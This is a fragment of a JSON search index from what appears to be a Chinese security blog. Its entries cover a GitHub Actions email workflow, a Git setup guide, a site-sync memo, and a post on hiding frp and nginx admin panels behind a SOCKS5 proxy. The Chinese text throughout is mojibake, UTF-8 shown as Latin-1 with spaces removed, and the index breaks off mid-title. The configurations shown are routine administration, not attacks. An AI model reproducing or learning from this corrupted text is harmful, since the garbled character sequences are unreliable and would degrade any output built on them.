å†…å®¹ã€‚Emailç›¸å…³å®ä¾‹å¦‚æœæ‚¨å¯¹ä¸€äº›å®æ—¶æ•°æ®æ„Ÿå…´è¶£ï¼Œæ¯”å¦‚æœ€æ–°çš„CVEã€CNVDæ¼æ´åº“ï¼Œäº¦æˆ–è€…æ‚¨å…³å¿ƒæœåŠ¡å™¨æœåŠ¡çš„è¿è¡ŒçŠ¶æ€ï¼Œäº¦æˆ–è€…æ˜¯æ¯å¤©çš„å¤©æ°”ï¼Œæ‚¨éƒ½å¯ä»¥ä½¿ç”¨GithubActionså¸‚åœºé‡Œçš„EmailActionç›¸å…³å®ä¾‹è¿›è¡Œå¤ç”¨ï¼Œç´§æ¥ç€å¯ä»¥å¯¹ç›¸å…³é…ç½®æ–‡ä»¶è¿›è¡Œé…ç½®è¾¾åˆ°æ‚¨çš„ç›®çš„ã€‚æˆ‘è¿™é‡Œä»¥æœåŠ¡å™¨çš„å®æ—¶è¿è¡Œä»»åŠ¡æ¥ä¸¾ä¾‹ï¼šç›¸å…³ä»£ç ç¤ºä¾‹å¤‡æ³¨action.ymlgitç›®å½•ä¸‹æµç¨‹æ–‡ä»¶ï¼Œç›®å½•ä¸å¯å˜åŠ¨ï¼Œæ–‡ä»¶åå¯è‡ªå®šä¹‰name:'GitHubActionsEmailActionsBybin4xin'ä»»åŠ¡åç§°on:[push]ä»»åŠ¡è§¦å‘æ¡ä»¶ï¼Œè¿™é‡ŒæŒ‡åœ¨åˆ†æ”¯æ”¶åˆ°æ¨é€è¯·æ±‚åå³æ‰§è¡Œjobs:ä»»åŠ¡æµç¨‹å¼€å§‹{folwname}:ä»»åŠ¡æµç¨‹1åç§°runs-on:ubuntu-latestä»»åŠ¡è¿è¡Œé•œåƒè‡ªå®šä¹‰ï¼Œå¯é€‰Windowsã€Linuxã€macOSsteps:æµç¨‹æ­¥éª¤å®šä¹‰å¼€å§‹-name:'Checkoutcodes'æ­¥éª¤åç§°ï¼Œä¸€ä¸ªæµç¨‹å¯ä»¥æœ‰å¤šä¸ªæ­¥éª¤uses:actions/checkout@v1ä½¿ç”¨actionså¸‚åœºå…±äº«ä»£ç ï¼Œåªéœ€è¦è®¾ç½®ä¸€äº›ç›¸å…³å¿…è¦å‚æ•°å³å¯æˆåŠŸè¿è¡Œactionrun:bash./processEmail.shè¿è¡Œç³»ç»Ÿå‘½ä»¤å‚è€ƒæ­¤å¤„å¦‚æœæœ‰å¤šæ¡å‘½ä»¤å¯ä»¥å¦‚å·¦è¾¹æ ¼å¼ä¹¦å†™needs:buildåœ¨{folwname}åï¼ŒActionsé»˜è®¤å¤šä¸ªæµç¨‹å¹¶å‘è¿›è¡Œï¼Œå¦‚æœæœ‰å…ˆåå…³ç³»åˆ™ä½¿ç”¨åˆ°æ­¤ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨actionsæ¥æ„å»ºä¸€å¥—æ ‡å‡†çš„ä»»åŠ¡æµç¨‹ï¼›ä¸‹ä¸€æ­¥ä½¿ç”¨é»˜è®¤çš„é‚®ä»¶actionè¿›è¡Œæµ‹è¯•ï¼Œå‚è€ƒGitHubActionsæ•™ç¨‹ï¼šå®šæ—¶å‘é€å¤©æ°”é‚®ä»¶æœ€åé™¤äº†æ–‡ç« å†…çš„çº¯æ–‡æœ¬å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥è‡ªå®šä¹‰é‚®ä»¶ä¸ºhtmlï¼Œç„¶åå‘ä¸€äº›æ¼‚äº®çš„é‚®ä»¶ï¼š#æ­¤å¤„å¸¦ç¾å…ƒç¬¦çš„å‡ä¸ºä¸¤å¯¹èŠ±æ‹¬å·ï¼Œè¯¦ç»†è¯·ç§»æ­¥(https://github.com/Bin4xin/Mail-Action/blob/master/.github/workflows/action.yml#L17)-name:'Sendmail'uses:dawidd6/action-send-mail@v3with:server_address:smtp.qq.comserver_port:465username:${secrets.MAIL_USERNAME}password:${secrets.MAIL_PASSWORD}subject:\"${env.REPORT_PLACE}-è®¢é˜…ä¿¡æ¯\"html_body:file://result.htmlto:3313336101@qq.comfrom:å“¨å…µ-${env.REPORT_COMMIT}content_type:text/htmlæˆ‘çš„æ€è·¯æ˜¯ï¼šå†™å¥½ä¸€äº›é€šç”¨æ¨¡ç‰ˆï¼Œhtmlæ¨¡ç‰ˆå¯ä»¥åœ¨æœ¬åœ°è°ƒè¯•å¥½ä¸Šä¼ å³å¯ï¼Œç„¶ååœ¨bashè„šæœ¬é‡Œæ‹¼æ¥ã€é—­åˆæ ‡ç­¾å³å¯ï¼›echo-e\"$fontStyleEnd\\n$fontStyleEnd\\n$htmlTempStart\\n$serverAllTipsInfo\\n$process\\n$htmlTempEnd\\n\"&gt;result.htmlæ•ˆæœå¦‚ä¸‹ï¼šæ‹“å±•é˜…è¯»å¿«é€Ÿå¼€å§‹ï¼šä½¿ç”¨GithubAtionsè®¢é˜…æ¯å¤©å¤©æ°”å…¶ä»–ä¸€äº›å¯èƒ½ç”¨åˆ°çš„Actionå˜é‡å…³äºä½¿ç”¨GitHubActionsè¿›è¡Œæ‰“åŒ…å†™åœ¨æœ€åå¤§æ•°æ®æ—¶ä»£ï¼Œä¿¡æ¯æ¥çš„æ›´åŠ ç®€å•å¿«æ·ï¼Œäººå¿ƒä¹Ÿæµ®èºï¼›ç°åœ¨å¾ˆå¤šåƒçš„ã€å–çš„ï¼Œè®²ç©¶ä¸€ä¸ªæ‰‹æ‰“ï¼Œè¿™ä¸ªæ‰‹æ‰“ç‰›ä¸¸ï¼Œé‚£ä¸ªæ‰‹ç£¨å’–å•¡ï¼›ä»€ä¹ˆæ—¶å€™èƒ½æœ‰å•†å®¶ã€å‚å•†æ‰“å‡ºæ‰‹å†™ä»£ç çš„å–ç‚¹å‘¢ï¼ŸæœŸå¾…ã€‚"
  },

  {
    "title"    : "en",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/en/",
    "date"     : "Nov 7, 2021",
    "content"  : "UsingGitTouseGitonthecommandline,youwillneedtodownload,install,andconfigureGitonyourcomputer.Youcanalsoinstalltousefromthecommandline.Formoreinformation,see:â€œAbout.â€IfyouwanttoworkwithGitlocally,butdonotwanttousethecommandline,youcaninsteaddownloadandinstalltheclient.Formoreinformation,see:â€œInstallingandconfiguring.â€Ifyoudonotneedtoworkwithfileslocally,letsyoucompletemanyGit-relatedactionsdirectlyinthebrowser,including:CreatingarepositoryForkingarepositoryManagingfilesBeingsocialSettingupGitDownloadandinstallthelatestversionofGit.Note:IfyouareusingaChromeOSdevice,additionalsetupisrequired:InstallaterminalemulatorsuchasTermuxfromtheGooglePlayStoreonyourChromeOSdevice.Fromtheterminalemulatorthatyouinstalled,installGit.Forexample,inTermux,enteraptinstallgitandthentypeywhenprompted.SetyourusernameinGit.SetyourcommitemailaddressinGit.AuthenticatingwithfromGitWhenyouconnecttoarepositoryfromGit,youwillneedtoauthenticatewithusingeitherHTTPSorSSH.Note:Youcanauthenticatetousing,foreitherHTTPorSSH.Formoreinformation,seeghauthlogin.ConnectingoverHTTPS(recommended)IfyouclonewithHTTPS,youcancacheyourcredentialsinGitusingacredentialhelper.Formoreinformation,see:â€œCloningwithHTTPSurlsâ€â€œCachingyourcredentialsinGit.â€ConnectingoverSSHIfyouclonewithSSH,youmustgenerateSSHkeysoneachcomputeryouusetopushorpullfrom.Formoreinformation,see:â€œCloningwithSSHurlsâ€â€œGeneratinganewSSHkey.â€NextstepsYounowhaveGitandallsetup.Youmaynowchoosetocreatearepositorywhereyoucanputyourprojects.Savingyourcodeinarepositoryallowsyoutobackupyourcodeandshareitaroundtheworld."
  },

  {
    "title"    : "å¤‡å¿˜å½•",
    "category" : "",
    "tags"     : "ç¬”è®°, Github Action",
    "url"      : "/blog/2021/memorandum-todo/",
    "date"     : "Oct 26, 2021",
    "content"  : "åšå®¢çš„è‡ªåŠ¨åŒ–åŒæ­¥é—®é¢˜å½“å‰é‡ä¸­ä¹‹é‡åœ¨ä¸å¯¹äºåšå®¢çš„è‡ªåŠ¨åŒ–åŒæ­¥é—®é¢˜çš„è§£å†³ï¼Œé‚£ä¹ˆè‡ªç„¶éœ€è¦å¯¹å½“ä¸‹åšå®¢åŒæ­¥è¿›è¡Œåˆ†æï¼›å½“ä¸‹åŒæ­¥æµç¨‹é—®é¢˜B4xinSynchronizeåŒæ­¥å¯¹åº”ä»“åº“bin4xin.github.io=&gt;gitpush&gt;www.sentrylab.cnbin4xin.gitee.io=&gt;gitpush&gt;about.sentrylab.cnsentrylab-www-cn=&gt;scp&gt;$vps/nginx_web/sentrylab/www=&gt;git-checkout&gt;www.sentrylab.cnsentrylab-about-cn=&gt;scp&gt;$vps/nginx_web/sentrylab/about=&gt;git-checkout&gt;about.sentrylab.cnå¦‚ä½•è§£å†³ï¼Ÿå¯ä»¥çœ‹å‡ºï¼Œæœ¬åœ°ä»“åº“å¤ªè¿‡äºå†—ä½™ï¼Œæˆ‘éœ€è¦åœ¨æœ¬åœ°æ„å»ºå®Œæˆåå°†ä¸¤ä¸ªJEKYLLï¼ˆHomeä¸Aboutï¼‰é¡¹ç›®ä¸‹çš„_siteæ‹·è´åˆ°å¯¹åº”ä»“åº“ä¸‹ï¼Œç„¶ågitpushï¼Œè¿™ä¹Ÿæ˜¯åæ¥ä¸ºä»€ä¹ˆæœ‰äº†B4xinSynchronizeï¼Œæˆ‘å«Œpushå¤ªç¹çäº†ï¼Œç”šè‡³è¿˜å–Šå‡ºäº†Letyourgitonlyyesornoçš„å£å·(æ±—)å®é™…ä¸Šï¼Œä½¿ç”¨Actionè¿›è¡Œæ„å»ºåå°±è§£å†³äº†éƒ¨åˆ†æœ¬åœ°ä»“åº“å¦‚bin4xin.github.ioçš„åŒæ­¥é—®é¢˜ï¼Œå¯ä»¥ç›´æ¥åœ¨Actionæ„å»ºåpushåˆ°åˆ†æ”¯ä¸Šæ˜¾ç¤ºï¼›ç§»æ­¥ç½‘ç«™æ„å»ºå†ç¨‹æŸ¥çœ‹è¯¦æƒ…è®¿é—®é€Ÿåº¦çš„é—®é¢˜è€Œä¸ºäº†æ‰€è°“çš„è®¿é—®é€Ÿåº¦ï¼Œå¦¥åäº†ä¸€äº›ä¼˜é›…æ€§ï¼Œæ‰€ä»¥è¿™ä¹Ÿæ˜¯å½“ä¸‹æˆ‘éœ€è¦å»è§£å†³çš„é—®é¢˜ï¼›å› ä¸ºä¸€äº›è¯¸å¦‚ç½‘ç«™å¤‡æ¡ˆç­‰åŸå› ï¼Œæˆ‘ä¸ªäººä¸å¾—ä¸æŠŠåšå®¢æ­å»ºåœ¨å›½å¤–çš„æœåŠ¡å™¨ä¸Šï¼Œè€Œå¯¼è‡´çš„é—®é¢˜å°±æ˜¯ï¼šè§£æã€è®¿é—®é€Ÿåº¦å˜å¾—æ…¢äº†å¾ˆå¤šï¼Œæˆ‘æƒ³è¿™ä¹Ÿæ˜¯å¾ˆå¤šäººæ‰€å›°æ‰°çš„é—®é¢˜ä¹‹ä¸€ï¼›äºæ˜¯æˆ‘å°±ä¸€ç›´åœ¨æ€è€ƒï¼Œæ˜¯å¦èƒ½å¤Ÿé’ˆå¯¹è¿™ä¸ªé—®é¢˜æ¥ä»æŠ€æœ¯ä¸Šåšä¸€äº›æ”¹å˜å‘¢ï¼šå¦‚ä½•è§£å†³ï¼Ÿcloudflarecname?åšå®¢å†…éƒ¨åˆ†ç±»è¾ƒä¸ºæ··ä¹±æ¯”å¦‚ï¼šblogä¸aboutä¸€å¼€å§‹åˆ†æ çš„æƒ³æ³•æ˜¯å‡†å¤‡é’ˆå¯¹ä¸ªäººç ”ç©¶è¿™ä¸€å—åšå•ç‹¬å±•ç¤ºï¼Œå¯æ˜¯ç°åœ¨çœ‹æ¥ç¡®å®æ˜¯åšåˆ°äº†ï¼Œä½†æ˜¯æ–°çš„é—®é¢˜æ¶Œç°å‡ºæ¥ï¼šåˆ†ç±»è¿‡äºæ··ä¹±å¦‚ä½•è§£å†³ï¼Ÿè€ƒè™‘ä¸­ä¸‹ä¸€æ­¥2021/10/26/21:04:22[éƒ¨åˆ†é—®é¢˜æ€»ç»“]Aboutä¸»é¡µè®¿é—®è·¯ç”±æ”¹å˜ï¼›Aboutæ„å»ºé—®é¢˜ï¼›è‹¥éœ€è§£å†³ä¸Šé¢çš„é—®é¢˜ï¼Œé‚£ä¹ˆäºŸéœ€ä¿®æ”¹çš„å°±æ˜¯å¯¹äºAboutçš„æºç æ„å»ºçš„é—®é¢˜æ˜¯å¦èƒ½å¤Ÿä»“åº“2Actionæ„å»ºçš„æºç æ¨é€çš„ä»“åº“1çš„åˆ†æ”¯ä¸Šï¼Ÿgithubä¸giteeä»“åº“åŒæ­¥é—®é¢˜ï¼›ç”±äºä½¿ç”¨çš„GITEEACTIONæ¨¡ç‰ˆå­˜åœ¨ç–‘é—®ï¼›æ‰€ä»¥æš‚æ—¶ä»¥ç¡¬ç¼–ç çš„å½¢å¼è¿›è¡Œè§£å†³äº†ï¼Œä¸æ˜¯éå¸¸çš„ä¼˜é›…ï¼Œè¿™é‡Œä¼šå…ˆæ ‡æ³¨ï¼Œä»¥åä¼šåœ¨ä¿®æ”¹å›æ¥ï¼›é¡µé¢æ·»åŠ è‡ªè¡Œç‚¹å‡»ï¼šåšå®¢å›½å†…é•œåƒ&amp;&amp;å›½å¤–é•œåƒè·³è½¬ï¼›å“åº”å¼æŠ˜å footerç›¸å…³ç®€ä»‹ï¼›CNAMEæ˜¯å¦èƒ½å¤Ÿå¯¹åº”ä¸åŒçš„é•œåƒè·³è½¬ï¼ŸDNSè§£æä¸­æ˜¯å¦èƒ½å¤Ÿè§£å†³åœ°åŸŸè·³è½¬é—®é¢˜ï¼Ÿå¾…å‚è€ƒé¡¹ç›®è®¢é˜…é¡µé¢å­˜åœ¨é—®é¢˜ï¼›åšå®¢åˆ†ç±»ä»£ç å±•ç¤ºæš‚æ— bugï¼Œä½†è®¿é—®è·¯ç”±å­˜åœ¨é—®é¢˜ï¼Œéœ€è€ƒè™‘ï¼›â€¦å½“ä¸‹ï¼šHomeä¸»é¡µAboutä¸»é¡µæœªæ¥ï¼šå›½å¤–é•œåƒï½œå›½å†…é•œåƒæˆ‘ç¬¬ä¸€ä¸ªæƒ³åˆ°çš„å°±æ˜¯é’ˆå¯¹ä¸åŒçš„è®¿é—®åŒºipæºè¿›è¡Œä¸åŒåœ°åŸŸè·³è½¬staticu_charngx_http_server_string[]=\"Server:COMMUNISTREGIMEPOWERSUPREME\"CRLF;"
  },

  {
    "title"    : "æµ…è°ˆå®é™…ç”Ÿäº§ä¸šåŠ¡ä¸­å…¬æœ‰äº‘å’Œç§æœ‰äº‘çš„è¾¹ç•Œ",
    "category" : "",
    "tags"     : "Cloud",
    "url"      : "/blog/2021/The-boundary-between-public-cloud-and-private-cloud/",
    "date"     : "Oct 24, 2021",
    "content"  : "å‰è¨€æˆ‘åœ¨WEBæ¸—é€çš„å·¥ä½œä¸­å¸¸å¸¸ä¼šç¢°åˆ°è¿™æ ·çš„ç°è±¡ï¼šå¾ˆå¤šä¼ä¸šå•ä½åœ¨å¯¹è‡ªèº«çš„èµ„äº§æ¢³ç†å¾€å¾€éƒ½å­˜åœ¨æˆ–å¤šæˆ–å°‘çš„é—®é¢˜ï¼Œå¦‚ï¼šé—®é¢˜ä¸ºä»€ä¹ˆäº§ç”Ÿï¼Ÿè§£å†³ï¼Ÿå¤‡æ³¨èµ„äº§æ¢³ç†æœ‰é—æ¼ä¼ä¸šå•ä½éƒ¨åˆ†è¾¹ç¼˜ä¸šåŠ¡å¤–åŒ…å¯¼è‡´ï¼›ä¸šåŠ¡ç”Ÿå‘½å‘¨æœŸé€»è¾‘å­˜åœ¨ç¼ºé™·å¯¼è‡´æ— æ³•é—­ç¯ï¼›æŠ€æœ¯äººå‘˜æŠ€æœ¯ç†è§£å‚å·®ä¸é½ï¼›â€¦-å…¬ç½‘æš´éœ²é¢è¿‡å¤šéƒ¨åˆ†å‘˜å·¥å®‰å…¨èƒ½åŠ›è–„å¼±æˆ–å¯¹æ­¤ä¸ä»¥ä¸ºç„¶ï¼›æŠ€æœ¯äººå‘˜æŠ€æœ¯ç†è§£å‚å·®ä¸é½ï¼›å±å®³å±•ç¤ºæŠ€æœ¯è§’åº¦çœ‹å•†ç”¨ä¸å¼€æºç³»ç»Ÿã€ç»„ä»¶ç‰ˆæœ¬è¿‡ä½å¯¹æŠ€æœ¯äººå‘˜çš„å·¥ä½œã€å›¢é˜Ÿé»˜å¥‘è¦æ±‚è¾ƒé«˜ï¼›å·¥ä½œæ˜¯å·¥ä½œã€ç”Ÿæ´»æ˜¯ç”Ÿæ´»ã€‚:Dâ€¦-ç­‰ç­‰&nbsp;&nbsp;&nbsp;ä»€ä¹ˆæ˜¯å…¬æœ‰äº‘ï¼Ÿå…¬æœ‰äº‘æ˜¯æœ€å¸¸è§çš„äº‘è®¡ç®—éƒ¨ç½²ç±»å‹ã€‚å…¬æœ‰äº‘èµ„æºï¼ˆä¾‹å¦‚æœåŠ¡å™¨å’Œå­˜å‚¨ç©ºé—´ï¼‰ç”±ç¬¬ä¸‰æ–¹äº‘æœåŠ¡æä¾›å•†æ‹¥æœ‰å’Œè¿è¥ï¼Œè¿™äº›èµ„æºé€šè¿‡Internetæä¾›ã€‚åœ¨å…¬æœ‰äº‘ä¸­ï¼Œæ‰€æœ‰ç¡¬ä»¶ã€è½¯ä»¶å’Œå…¶ä»–æ”¯æŒæ€§åŸºç¡€ç»“æ„å‡ä¸ºäº‘æä¾›å•†æ‰€æ‹¥æœ‰å’Œç®¡ç†ã€‚ä»€ä¹ˆæ˜¯ç§æœ‰äº‘ã€æ··åˆäº‘ï¼Ÿå•°å—¦äº†è¿™ä¹ˆå¤šï¼Œä»‹ç»å…¬æœ‰äº‘æ˜¯å› ä¸ºè¦ä»æŠ€æœ¯è§’åº¦æ¥çœ‹é—®é¢˜å°±éœ€è¦å®é™…åº”ç”¨ï¼Œè€Œå®éªŒæ¡ä»¶æœ‰é™ï¼Œåªèƒ½é€šè¿‡å…¬æœ‰äº‘ç¯å¢ƒä¸‹æ¥ç ”ç©¶å…¬ç§äº‘è¾¹ç•Œï¼Œæ­¥å…¥ä¸»é¢˜ï¼›ç¯å¢ƒå‡è®¾ç°é˜¶æ®µèƒ½å¤Ÿæ¨¡æ‹Ÿçš„å…¬æœ‰äº‘ç¯å¢ƒå¦‚ä¸‹ï¼šä¸šåŠ¡ç›‘å¬åœ°å€ç›‘å¬ç«¯å£å¤‡æ³¨nginxä¸»ç«™ç¼ºçœ/:::443-APIæ¥å£ç¼ºçœ/:::7000frpsåç«¯ç®¡ç†ç»„ä»¶ç¼ºçœ/:::7500frpsnginxè´Ÿè½½å‡è¡¡ç¼ºçœ/:::8001proxy_passæˆ‘ä»¬çŸ¥é“ï¼Œ1ã€2ä¸¤ä¸ªä¸šåŠ¡æ˜¯éœ€è¦é€šè¿‡å…¬ç½‘è®¿é—®çš„ï¼Œå½“ç„¶APIä¹Ÿå¯ä»¥éƒ¨ç½²å†…ç½‘ï¼Œä½†å‰ææ˜¯å¯¹åº”APIè¯·æ±‚ä»£ç ä¹Ÿéœ€è¦æœ‰æ‰€æ”¹åŠ¨ï¼Œæ‰€ä»¥æš‚æ—¶å…ˆä¸åŠ¨ï¼›é‚£ä¹ˆç€é‡æ¥çœ‹3å’Œ4ã€‚éƒ¨ç½²â€ç§æœ‰â€äº‘å®é™…ä¸Šï¼Œfrpæ˜¯æ‹¥æœ‰ç®¡ç†é¢æ¿é¡µé¢çš„ï¼Œå…·ä½“ç®¡ç†åœ°å€æ˜¯0.0.0.0:7500ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•è®©å¥¹æœ¬åœ°ç›‘å¬ä»è€Œè¾¾åˆ°â€ç§æœ‰è®¿é—®â€çš„ç›®çš„å‘¢ï¼Ÿåœ¨é»˜è®¤æƒ…å†µä¸‹ç»™å‡ºçš„é…ç½®æ— æ³•è¿›è¡Œæœ¬åœ°ç›‘å¬é…ç½®ï¼ŒæŸ¥çœ‹å…¶å¯¹åº”æœåŠ¡ç«¯æ–‡æ¡£é…ç½®å¦‚ä¸‹ï¼š[common]bind_port=7000#æˆæƒç ï¼Œè¯·æ”¹æˆæ›´å¤æ‚çš„token={your_token_value}#frpç®¡ç†é¢æ¿ç›‘å¬åœ°å€å’Œç«¯å£ï¼Œè¯·æŒ‰è‡ªå·±éœ€æ±‚æ›´æ”¹dashboard_addr=127.0.0.1dashboard_port=7500#frpç®¡ç†åå°ç”¨æˆ·åå’Œå¯†ç ï¼Œè¯·æ”¹æˆè‡ªå·±çš„dashboard_user={your_dashboard_user_value}dashboard_pwd={your_dashboard_pwd_value}enable_prometheus=true#frpæ—¥å¿—é…ç½®log_file=/var/log/frps.loglog_level=infolog_max_days=3åŠ ä¸Šdashboard_addr=127.0.0.1ä¸€è¡Œé…ç½®å³å¯ï¼›#netstat-antup|grepfrptcp00:::75000.0.0.0:*LISTEN5557/./frps#é…ç½®å‰#netstat-antup|grepfrptcp00127.0.0.1:75000.0.0.0:*LISTEN5557/./frps#é…ç½®åè€ŒnginxåŒç†ï¼Œä¿®æ”¹severåŒºå—ç›‘å¬å³å¯server{listenlocalhost:8001;}å€¼å¾—æ³¨æ„çš„æ˜¯ï¼šå½“nginxåœ¨å¤„äºè¿è¡Œä¸­ï¼Œé…ç½®æœ¬åœ°ç›‘å¬ånginx-sreloadæ˜¯æ— æ³•ç”Ÿæ•ˆçš„ï¼Œæ­£ç¡®æ“ä½œåº”è¯¥æ˜¯nginx-sstopåœ¨å¯åŠ¨ã€‚æœåŠ¡ç§æœ‰æˆ‘ä»¬å¯¹å…¬æœ‰äº‘ä¸Šçš„åº”ç”¨è¿›è¡Œç§æœ‰åŒ–åï¼Œå‡è®¾ç°åœ¨éœ€è¦è®¿é—®åº”ç”¨ï¼Œè¦æ€ä¹ˆåšå‘¢ï¼Ÿç­”ï¼šVPNä»£ç†ï¼ˆä»¥ä¸‹ç®€ç§°proxyï¼‰ç¬¬ä¸€æ­¥ï¼šå‡†å¤‡proxyè¿æ¥æ–‡ä»¶ï¼ˆè¿™é‡ŒåŒæ ·ä»¥frpä¸ºä¾‹ï¼‰frpc-proxy.ini[common]server_addr={proxy_server_addr}server_port={proxy_server_port}token={your_token_value}[{some_word_descr_clien}]type=tcpremote_port={proxy_traffic_port}plugin=socks5plugin_user={proxy_server_username}plugin_passwd={proxy_server_pwd}...ç¬¬äºŒæ­¥ï¼šproxy_serverç«¯è¿›è¡Œproxyå¯åŠ¨ï¼Œnohupfrps-cfrps.ini&amp;ç¬¬ä¸‰æ­¥ï¼šproxy_clientè¿æ¥å¯åŠ¨ï¼Œnohupfrps-cfrpc-proxy.ini&amp;ç¬¬å››æ­¥ï¼šæµ‹è¯•ã€‚ä¸‹é¢é™„ä¸Šå¸¸è§proxyè½¯ä»¶ï¼šå…¨å±€proxyç»ˆç«¯proxyæµè§ˆå™¨proxyå¤‡æ³¨Proxifierproxychains4å¾ˆå¤š-å¦‚ä¸Šï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡proxyçš„å½¢å¼è®¿é—®åˆ°ç§ç½‘åº”ç”¨ï¼›ç»ˆç«¯proxyè¿æ¥sshå‘½ä»¤å¯ä»¥ï¼šproxychains4sshroot@{your_inside_ip}ï¼ŒåŒæ—¶ä¸è¦å¿˜è®°ç™»å½•ECSæ§åˆ¶å°é˜»æ­¢ssh220.0.0.0/0å³å¯ï¼Œè‹¥proxyå¤±æ•ˆå¯ä»¥æ§åˆ¶å°è¿æ¥ç§ç½‘åœ°å€æˆ–è€…é‡æ–°æ”¾è¡Œå…¬ç½‘sshç«¯å£æµé‡ã€‚$proxychains4sshroot@{your_inside_ip}Â·Â·Â·WelcometoAlibabaCloudElasticComputeService!Nomail.Lastlogin:ThuNov1111:49:012021from{your_inside_ip}root@bin4xin:~#proxychains4é…ç½®ï¼š/etc/proxychains.conf||/usr/local/etc/proxychains.conf=&gt;socks5{proxy_server_addr}{proxy_traffic_port}{proxy_server_username}{proxy_server_pwd}ï¼Œmacç»ˆç«¯è®°å¾—è¦SIPå…³é—­æ‰å¯ä»¥ä½¿ç”¨pc4ã€‚æ€»ç»“å®é™…ä¸Šæ¸—é€æµ‹è¯•å°±æ˜¯æ¨¡æ‹Ÿé»‘å®¢çš„æ–¹æ³•å¯¹ç³»ç»Ÿå’Œç½‘ç»œè¿›è¡Œæ”»å‡»æ€§æµ‹è¯•ï¼Œç›®çš„æ˜¯ä¾µå…¥ç³»ç»Ÿï¼Œé€šè¿‡å·¥å…·ç»“åˆå®‰å…¨å·¥ç¨‹å¸ˆçš„æŠ€æœ¯æ‰‹æ®µï¼Œå‘ç°åº”ç”¨ç³»ç»Ÿåœ¨é€»è¾‘æ–¹é¢çš„å®‰å…¨é£é™©éšæ‚£ï¼›è€Œå·¥ä½œä¸­å¸¸ä»¥é»‘ã€ç°ç›’ä¸ºä¸»çš„æ¸—é€æµ‹è¯•ï¼Œå…¬ç½‘å±…å¤šï¼Œè‹¥èƒ½å‡å°‘å…¬ç½‘æš´éœ²é¢ï¼Œåœ¨æŸç§ç¨‹åº¦ä¸Šæ¥è¯´æ˜¯ä¹Ÿæ˜¯åœ¨å…¬æœ‰ç§æœ‰äº‘çš„è¾¹ç•Œå¤„è®¾ç½®äº†ä¸€é“é˜»ç¢ï¼Œæ— å½¢ä¸­ç»™ä¸€äº›æ¶æ„åˆ©ç”¨è€…å¢åŠ äº†æ”»å‡»éš¾åº¦ï¼›å½“ç„¶è¿™é‡Œåªæ˜¯ç®€å•ä»‹ç»äº†ä¸€äº›å¸¸è§çš„åº”ç”¨éƒ¨ç½²ï¼Œèƒ½é€šè¿‡æŠ€æœ¯æ”¹å˜çš„è¿˜æœ‰å¾ˆå¤šï¼Œå½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥å‘æ•£æ€ç»´æ¥åšåˆ°æ›´å¤šå¾ˆé…·çš„äº‹æƒ…ã€‚"
  },

  {
    "title"    : "æ–‡ç« é€Ÿè§ˆ",
    "category" : "",
    "tags"     : "ç¬”è®°, wiki",
    "url"      : "/top/2021/sentry-lab-markdown-usage/",
    "date"     : "Jul 31, 2021",
    "content"  : "Tips:è¡¨ç¤ºæ–°å¢è¡¨ç¤ºä¿®æ”¹è¡¨ç¤ºå‡çº§è¡¨ç¤ºå¼•ç”¨æˆ–ç«™ç‚¹æ–°å¢å±•ç¤ºè®°å½•ClicktopreviewHomeArticlesreleasenotequicklyæ—¶é—´æ“ä½œä¹¦ç­¾2024/07/18ã€Šã€ŒmacOSã€æ›´æ–°XZ|UpgradeYourXZVersionã€‹2022/12/13ã€Šã€ŒOBSonMacOS13ã€:ï¼ˆæ‚ é›…deï¼‰å½•åˆ¶æ¡Œé¢å£°éŸ³ã€‹2022/11/21ã€Šã€ŒJekyllå¼€å‘ç¾åŒ–ã€:å¦‚ä½•æ·»åŠ è®¿å®¢æ¬¡æ•°IIï¼ˆä»¥ç¿»é¡µé’Ÿæ ·å¼ä¸ºä¾‹ï¼‰ã€‹2022/11/18ã€Šã€ŒJekyllå¼€å‘ç¾åŒ–ã€:å¦‚ä½•æ·»åŠ è®¿å®¢æ¬¡æ•°Iã€‹2022/11/4ã€Š2022å¹´å…¨çœé€šä¿¡å’Œäº’è”ç½‘è¡Œä¸šèŒä¸šæŠ€èƒ½ç«èµ›WriteUpã€‹2024/04/292022/10/8*NEWã€Š::è‹¥ä¾::vulnerabilitysummaryã€‹2022/10/212022/09/30*NEWã€ŠICTnetworksecurityCTF2022walkthroughã€‹2022/09/25ã€ŠIndustrialInternetCTF2022walkthroughã€‹2022/09/202022/04/5*NEWã€ŠæœªæˆæƒMongoDBï¼šé¸¿é—¨å®´ï¼Ÿã€‹2022/09/272021/11/15*NEWã€Šç”¨GithubActionsæœ‰æ„Ÿã€‹2021/11/152021/10/26*NEWã€Šå¤‡å¿˜å½•ã€‹2021/11/112021/10/24*NEWã€Šæµ…è°ˆå®é™…ç”Ÿäº§ä¸šåŠ¡ä¸­å…¬æœ‰äº‘å’Œç§æœ‰äº‘çš„è¾¹ç•Œã€‹2021/12/152021/05/7*NEWã€ŠåŸºäºModbusåè®®ä¸KingViewå®ç°Openplcä»¿çœŸé€šè®¯ã€‹2021/01/242021/03/13*NEWã€Šç”¨å‹NC6.5javaååºåˆ—åŒ–ã€‹2021/03/13ã€ŠCST2021å¹´4æœˆ14æ—¥æ˜ŸæœŸä¸‰ï¼šä¸€æ¬¡æœ”æºäº‹ä»¶çš„è®°å½•ã€‹2021/03/13ã€Šè¾›ä¸‘Â·æœ¬å‘½å¹´å¹´åçš„ä¸€äº›æ€è€ƒã€‹2020/09/25ã€Šæœ‰å…³äºç½‘ç»œå®‰å…¨è¡Œä¸šçš„ä¸€äº›æ€è€ƒã€‹2022/10/82020/09/25*NEWã€Šä¸å¾—ä¸è°ˆçš„ï¼šã€ŒSpringBootã€æœªæˆæƒæ¸—é€ã€‹2020/09/11ã€Šã€Œæ’é”™ã€ï¼šDockerå¯åŠ¨vulnhubæŠ¥é”™æ’é”™ã€‹2020/09/1ã€Šã€ŒæŠ€å·§ã€ï¼šLinux&amp;UnixTerminalå°æŠ€å·§ã€‹2020/06/21ã€Šã€Œå®‰å…¨å·¥å…·ã€:A-Web_Vuln_Scanå’ŒaqåŸŸåçˆ†ç 